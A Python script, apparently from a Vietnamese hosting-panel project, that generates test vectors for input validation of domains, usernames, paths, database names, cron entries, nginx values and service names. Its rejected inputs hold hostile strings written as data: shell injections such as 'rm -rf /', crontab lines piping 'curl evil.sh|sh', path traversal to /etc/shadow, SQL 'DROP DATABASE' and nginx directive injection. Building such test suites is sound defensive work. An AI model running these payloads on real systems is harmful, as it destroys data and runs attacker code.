#!/usr/bin/env python3
"""Sinh contracts/test-vectors/evil-inputs.json.

Mỗi vector: input, expect (reject|accept), layer:
- schema:   JSON Schema (defs.schema.json) phải tự quyết định đúng; check_contracts.py kiểm.
- semantic: schema có thể chấp nhận, tầng nghiệp vụ (Laravel) và agent (Go) BẮT BUỘC từ chối;
            test PHP/Go ở Phase 3–6 dùng lại đúng các vector này.
"""
import json
from pathlib import Path

OUT = Path(__file__).resolve().parents[1] / "test-vectors" / "evil-inputs.json"

R, A = "reject", "accept"
V = {
    "domain": ("Domain", [
        ("anphat.vn", A, "schema", "Domain hợp lệ"),
        ("shop.anphat.vn", A, "schema", "Subdomain hợp lệ"),
        ("xn--bcher-kva.example", A, "schema", "Punycode hợp lệ"),
        ("example.xn--p1ai", A, "schema", "TLD punycode"),
        ("Anphat.VN", R, "schema", "Chữ hoa: phải chuẩn hóa chữ thường trước"),
        ("anphat.vn;rm -rf /", R, "schema", "Chèn lệnh shell"),
        ("anphat.vn\nserver_name evil.com", R, "schema", "Chèn dòng cấu hình nginx"),
        ("../etc/passwd", R, "schema", "Path traversal"),
        ("-anphat.vn", R, "schema", "Nhãn bắt đầu bằng gạch nối"),
        ("anphat-.vn", R, "schema", "Nhãn kết thúc bằng gạch nối"),
        ("a" * 64 + ".vn", R, "schema", "Nhãn dài hơn 63 ký tự"),
        ("anphat", R, "schema", "Thiếu TLD"),
        ("192.168.1.10", R, "schema", "Địa chỉ IP thay cho domain"),
        ("*.anphat.vn", R, "schema", "Wildcard không cho phép ở website"),
        ("anphat.vn ", R, "schema", "Khoảng trắng thừa"),
        ("an phat.vn", R, "schema", "Khoảng trắng giữa"),
        ("anphat.vn.", R, "schema", "Dấu chấm cuối (FQDN) phải bỏ trước"),
        ("bücher.example", R, "schema", "Unicode chưa chuyển punycode"),
        ("localhost.localdomain", R, "semantic", "Tên nội bộ bị cấm"),
        ("admin.itso.local", R, "semantic", "Trùng domain của panel"),
        ("anphat.vn{}", R, "schema", "Ký tự ngoặc nhọn phá cú pháp nginx"),
    ]),
    "username": ("Username", [
        ("anphat", A, "schema", "Hợp lệ"),
        ("mktitso", A, "schema", "Hợp lệ"),
        ("root", R, "schema", "Username hệ thống"),
        ("mysql", R, "schema", "Username dịch vụ"),
        ("itso", R, "schema", "Username của panel"),
        ("Anphat", R, "schema", "Chữ hoa"),
        ("1anphat", R, "schema", "Bắt đầu bằng số"),
        ("ab", R, "schema", "Ngắn hơn 3 ký tự"),
        ("a" * 17, R, "schema", "Dài hơn 16 ký tự"),
        ("an-phat", R, "schema", "Gạch nối"),
        ("anphat;id", R, "schema", "Chèn lệnh"),
        ("www-data", R, "schema", "User web server"),
        ("ubuntu", R, "semantic", "User mặc định của cloud image (danh sách cấm mở rộng ở agent)"),
    ]),
    "path": ("RelPath", [
        (".", A, "schema", "Gốc home"),
        ("sites/anphat.vn/public/index.php", A, "schema", "Đường dẫn tương đối hợp lệ"),
        (".env", A, "schema", "File ẩn hợp lệ"),
        ("sites/anphat.vn/.well-known/acme-challenge/x", A, "schema", "Thư mục ẩn hợp lệ"),
        ("/etc/shadow", R, "schema", "Đường dẫn tuyệt đối"),
        ("../other/secret", R, "schema", "Thoát lên thư mục cha"),
        ("sites/../../etc/passwd", R, "schema", "Traversal giữa đường dẫn"),
        ("sites/..", R, "schema", "Kết thúc bằng .."),
        ("sites/./x", R, "schema", "Đoạn . không chuẩn hóa"),
        ("sites//x", R, "schema", "Hai dấu gạch chéo liên tiếp"),
        ("sites/x\u0000.php", R, "schema", "Ký tự NUL"),
        ("sites/x\n.php", R, "schema", "Ký tự xuống dòng"),
        ("", R, "schema", "Rỗng"),
        ("sites/", R, "schema", "Kết thúc bằng gạch chéo"),
        ("sites/link-to-root/etc", R, "semantic", "Symlink trỏ ra ngoài home: agent kiểm sau khi resolve (openat2 RESOLVE_BENEATH)"),
        ("..%2f..%2fetc%2fpasswd", A, "semantic", "Chuỗi URL-encoded là tên file hợp lệ; API không được decode hai lần"),
    ]),
    "db_name": ("DbName", [
        ("anphat_web", A, "schema", "Hợp lệ"),
        ("anphat_shop2", A, "schema", "Có số"),
        ("anphat-web", R, "schema", "Gạch nối"),
        ("anphat_web; DROP DATABASE mysql", R, "schema", "SQL injection"),
        ("`anphat`", R, "schema", "Backtick"),
        ("Anphat_web", R, "schema", "Chữ hoa"),
        ("_anphat", R, "schema", "Bắt đầu bằng gạch dưới"),
        ("a" * 65, R, "schema", "Dài hơn 64 ký tự"),
        ("mysql", R, "semantic", "DB hệ thống"),
        ("information_schema", R, "semantic", "DB hệ thống"),
        ("other_web", R, "semantic", "Không có tiền tố username của account"),
    ]),
    "cron_expr": ("CronExpr", [
        ("*/15 * * * *", A, "schema", "Mỗi 15 phút"),
        ("0 2 * * *", A, "schema", "2 giờ sáng"),
        ("0 0 1 1-12/3 *", A, "schema", "Theo quý"),
        ("* * * * *", R, "semantic", "Mỗi phút: vượt cron_min_interval_min (5) của gói"),
        ("@reboot", R, "schema", "Từ khóa đặc biệt không cho phép"),
        ("* * * * * root rm -rf /", R, "schema", "Trường thừa (định dạng /etc/crontab)"),
        ("*/5 * * * *\n* * * * * curl evil.sh|sh", R, "schema", "Chèn dòng crontab"),
        ("0 2 * *", R, "schema", "Thiếu trường"),
        ("0 2 * * MON", R, "schema", "Tên thứ (chỉ cho phép dạng số)"),
        ("99 2 * * *", R, "semantic", "Giá trị ngoài miền (phút 0–59): parser nghiệp vụ kiểm"),
    ]),
    "cron_command": ("CronCommand", [
        ("php artisan schedule:run", A, "schema", "Hợp lệ"),
        ("/usr/bin/php8.3 bin/cleanup.php --days=7", A, "schema", "Hợp lệ"),
        ("php a.php\n* * * * * curl evil.sh|sh", R, "schema", "Chèn dòng crontab"),
        ("php a.php\r", R, "schema", "Ký tự CR"),
        ("", R, "schema", "Rỗng"),
        ("x" * 1025, R, "schema", "Quá dài"),
    ]),
    "nginx_size": ("NginxSize", [
        ("64m", A, "schema", "Hợp lệ"),
        ("1g", A, "schema", "Hợp lệ"),
        ("64m; include /etc/shadow", R, "schema", "Chèn directive"),
        ("64M", R, "schema", "Chữ hoa (chuẩn hóa trước)"),
        ("-1", R, "schema", "Số âm"),
        ("64mb", R, "schema", "Đơn vị không hợp lệ"),
    ]),
    "header_value": ("HeaderValue", [
        ("SAMEORIGIN", A, "schema", "Hợp lệ"),
        ("max-age=31536000, includeSubDomains", A, "schema", "Hợp lệ"),
        ("x; add_header Set-Cookie evil", R, "schema", "Chèn directive bằng ;"),
        ("x }\nserver { listen 80;", R, "schema", "Phá khối cấu hình"),
        ("$request_uri", R, "schema", "Biến nginx"),
        ("x\" always", R, "schema", "Thoát chuỗi"),
    ]),
    "php_version": ("PhpVersion", [
        ("8.3", A, "schema", "Hợp lệ"),
        ("8.3; rm -rf /", R, "schema", "Chèn lệnh"),
        ("../8.3", R, "schema", "Traversal tới socket khác"),
        ("7.4", R, "semantic", "Phiên bản không có trong gói/không được cài"),
    ]),
    "hostname": ("Hostname", [
        ("srv-hn-01", A, "schema", "Hợp lệ"),
        ("srv01.itso.local", A, "schema", "FQDN hợp lệ"),
        ("SRV01", R, "schema", "Chữ hoa"),
        ("srv01;reboot", R, "schema", "Chèn lệnh"),
        ("-srv01", R, "schema", "Bắt đầu bằng gạch nối"),
        ("srv01\nevil", R, "schema", "Xuống dòng"),
        ("", R, "schema", "Rỗng"),
        ("srv 01", R, "schema", "Khoảng trắng"),
    ]),
    "service_name": ("ServiceName", [
        ("nginx", A, "schema", "Trong allowlist"),
        ("php8.3-fpm", A, "schema", "Trong allowlist"),
        ("itso-agent", R, "schema", "Agent không tự điều khiển mình"),
        ("sshd; rm -rf /", R, "schema", "Chèn lệnh"),
        ("../../etc/systemd/system/evil", R, "schema", "Traversal"),
        ("docker", R, "schema", "Ngoài allowlist"),
    ]),
    "recipe": ("Recipe", [
        ("quota", A, "schema", "Recipe có sẵn"),
        ("acl", A, "schema", "Recipe có sẵn"),
        ("https://evil.example/x.sh", R, "schema", "URL tùy ý"),
        ("quota && curl evil|sh", R, "schema", "Chèn lệnh"),
        ("apache2", R, "schema", "Ngoài allowlist"),
    ]),
}


def main():
    cats = {}
    total = 0
    for cat, (schema, vectors) in V.items():
        cats[cat] = {"schema": f"agent-ops/defs.schema.json#/$defs/{schema}", "vectors": [
            {"input": x, "expect": e, "layer": layer, "note": note} for x, e, layer, note in vectors]}
        total += len(vectors)
    OUT.write_text(json.dumps({"version": 1, "total": total, "categories": cats}, ensure_ascii=False, indent=2) + "\n",
                   encoding="utf-8")
    print(f"Đã sinh evil-inputs: {total} vector")


if __name__ == "__main__":
    main()
